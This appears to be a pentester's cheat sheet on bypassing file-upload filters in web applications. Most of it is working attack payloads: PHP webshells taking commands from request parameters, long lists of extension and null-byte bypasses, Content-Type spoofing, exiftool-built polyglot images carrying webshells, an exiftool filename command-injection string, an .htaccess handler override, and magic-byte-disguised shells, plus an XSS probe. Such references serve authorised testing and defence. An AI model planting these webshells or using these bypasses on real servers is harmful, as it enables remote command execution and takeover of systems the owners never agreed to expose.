# File Upload Evasion

Search Tag(s): #helpers #webapp-pentesting #file-upload

## PHP Webshell Functions

Check `disable_functions` in `phpinfo()`.

| PHP Function             | Description                                                 |
| ------------------------ | ----------------------------------------------------------- |
| `system`                 | Executes a command and return its output.                   |
| `shell_exec`             | Executes a command and displays the output immediately.     |
| `passthru`               | Executes a command and displays the raw output.             |
| backtick operator (\`\`) | Executes contents inside the backtick as a shell command.   |
| `popen`                  | Executes a command and returns a pointer.                   |
| `exec`                   | Executes a command and returns the last line of the output. |
| `pcntl_exec`             | Executes a command or a program.                            |
| `proc_open`              | Similar to `popen()`.                                       |

```
<?php echo fread(popen($_REQUEST["cmd"], "r"), 4096); ?>
```

## Bypass File Extension Validation

### Insufficient Blacklisting

#### PHP

```
.pht
.phtm
.phtml
.pgif
.php3
.php4
.php5
.php7
.phps
.inc
.php.inc
.phar
.hphp
```

Server Side Include (SSI) in Apache

```
.stm
.shtm
.shtml
```

#### ASP.NET

```
.exe
.dll
```

VBScript

```
.asp
.vbhtml
```

C# .NET

```
.aspx
.asmx
.asa
.ashx
.cshtm
.rem
.aspq
.axd
.soap
.xamlx
```

#### Java Web

```
.jsp
.jsw
.jsv
.jspf
.jspx
.xsp
```

#### HTML5

```
.html
.htm
```

Insert XSS Payload.

```
<script>alert('XSS')</script>
```

### Modify File Extension

#### PHP

Switch the letter(s) case.

```
.PHP
.pHp
.Php
.pHP
.phP
```

Double extension.

```
.php.jpg
.php.jpeg
.php.png
.php.gif
.php.pdf

.jpg.php
.png.php
.gif.php
.pdf.php
```

File extension handling and Windows dots.

```
%2Ephp
..php
.php.
.php......
```

Inserting suffixes either slashes or hashtag sign.

```
.php/
.php//
.php\
.php#
```

Strip file extension strings.

```
.p.phphp
.p.phtmlhtml
```

Insert whitespace.

```
implant .php
```

NULL byte extension.

```
.phpA.jpg
.php%00.jpg
.php%0d%0a.jpg
.php\x00.jpg

.phpA.jpeg
.php%00.jpeg
.php%0d%0a.jpeg
.php\x00.jpeg

.phpA.png
.php%00.png
.php%0d%0a.png
.php\x00.png

.phpA.gif
.php%00.gif
.php%0d%0a.gif
.php\x00.gif

.phpA.pdf
.php%00.pdf
.php%0d%0a.pdf
.php\x00.pdf
```

Insert newlines.

```
.jpg\x0d\x0a.php
.jpeg\x0d\x0a.php
.png\x0d\x0a.php
.gif\x0d\x0a.php
.pdf\x0d\x0a.php
```

#### ASP.NET

Windows NTFS ADS

```
.aspx:.jpg
```

## Local File Inclusion

Perform local file inclusion after uploading it.

```
.txt
.cgi
.sh
.jpg
.jpeg
.png
.gif
.bmp
.pdf
.js
```

Empty file extension/filename.

```
implant
implant.
.php
```

## Content Type Restriction/MIME

Modify the `Content-Type` HTTP header's value

```
application/x-php
application/octet-stream
text/plain
image/jpeg
image/png
image/gif
application/pdf
```

## Insert Metadata with Webshell

### Polyglot Attack

Create an empty file.

```
$ convert -size 32x32 xc:white file.jpeg
```

Then insert metadata using `exiftool`.

```
$ exiftool -Comment="<h1>chiara<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" file.jpeg

$ exiftool -Copyright="<h1>chiara<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" file.jpeg

$ exiftool -DocumentName="<h1>chiara<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" file.jpeg
```

### Command Injection

> [!NOTE] Exiftool Exploit Version
> This only works on the server-side if the `exiftool` is lower than version **12.38**.

```
filename="touch test; <commands> |"
```

## Overwrite Server Configuration

Upload the `.htaccess` config file and specify the filename exactly as it is. For example when you want to upload a file with any extension to let the server read it as it was `.php` name it something like `.abc`.

```
AddType application/x-httpd-php .<any_extension>
AddType application/x-httpd-php PHP
```

TODO: Add the rest which are busybox, IIS, Python (refer to the links)

## Magic Bytes

TODO: Make a table of magic bytes

Check magic bytes with either `hexdump` or `xxd`.

### PNG

```
Hex Signature

89 50 4E 47 0D 0A 1A 0A

ISO 8859-1

‰PNG␍␊␚␊
```

```php
‰PNG␍␊␚␊
<?php echo system($_GET['cmd']); ?>
```

### JPG/JPEG

```
FF D8 FF EE

ÿØÿî

FF D8 FF E0

ÿØÿà

FF D8 FF E0 00 10 4A 46 49 46 00 01

ÿØÿà␀␐JFIF␀␁
```

```php
ÿØÿî
<?php echo system($_GET['cmd']); ?>


ÿØÿà
<?php echo system($_GET['cmd']); ?>


ÿØÿà␀␐JFIF␀␁
<?php echo system($_GET['cmd']); ?>
```

### PDF

```
25 50 44 46 2D

%PDF-
```

```php
%PDF-
<?php echo system($_GET['cmd']); ?>
```

### GIF

```php
GIF87a; <?php system($_GET['cmd']); ?>
GIF89a; <?php system($_GET['cmd']); ?>
```

## ImageMagick

TODO: Refer the link for the Imagemagick exploits

```

```

---
## References

### PayloadsAllTheThings

- [PayloadsAllTheThings: Extension PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20PHP/)

- [PayloadsAllTheThings: Extension HTML](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20HTML/)

- [PayloadsAllTheThings: Extension PDF JS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20PDF%20JS/)

- [PayloadsAllTheThings: Extension ASP](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP/)

- [PayloadsAllTheThings: Server Side Include](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Server%20Side%20Include/)

- [PayloadsAllTheThings: Picture Metadata](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20Metadata/)

- [PayloadsAllTheThings: Configuration Apache .htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/)

- [PayloadsAllTheThings: Configuration Busybox httpd.conf](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf/)

- [PayloadsAllTheThings: Configuration IIS web.confg](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/)

- [PayloadsAllTheThings: Configuration Python __init__.py](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files/Configuration Python __init__.py/)

- [PayloadsAllTheThings: uWSGI configuration file](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/)

- [PayloadsAllTheThings: ImageMagick Exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Picture%20ImageMagick/README.md)

- [PayloadsAllTheThings: Zip Slip](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Zip%20Slip/)

- [PayloadsAllTheThings: File Upload MindMap](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Images/file-upload-mindmap.png)

### Hacktricks

- [Hacktricks: File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)

- [Hacktricks: PHP - Useful Functions & disable_functions/open_basedir bypass](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass)

### Exploit Notes

- [Exploit Notes: File Upload Attack](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/)

- [File Upload Attack on Exiftool](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack-on-exiftool/)

https://secnhack.in/unrestricted-file-uploading-vulnerability/

https://zofixer.com/what-is-unsafe-file-upload-file-extension-filter-bypass-vulnerability/